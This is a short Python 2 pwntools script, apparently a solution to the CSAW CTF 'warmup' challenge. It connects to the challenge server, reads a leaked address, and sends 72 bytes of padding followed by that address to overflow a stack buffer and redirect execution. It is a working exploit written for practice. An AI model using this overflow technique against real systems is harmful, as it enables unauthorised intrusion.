#!/usr/bin/env python2

from pwn import *


# eip = 62
buf = "a" * 72

r = remote("pwn.chal.csaw.io", 8000)
#r = process("./warmup")
r.recvuntil("WOW:")
n = int(r.recvn(8), 16)
buf += p64(n)
r.sendline(buf)
r.interactive()
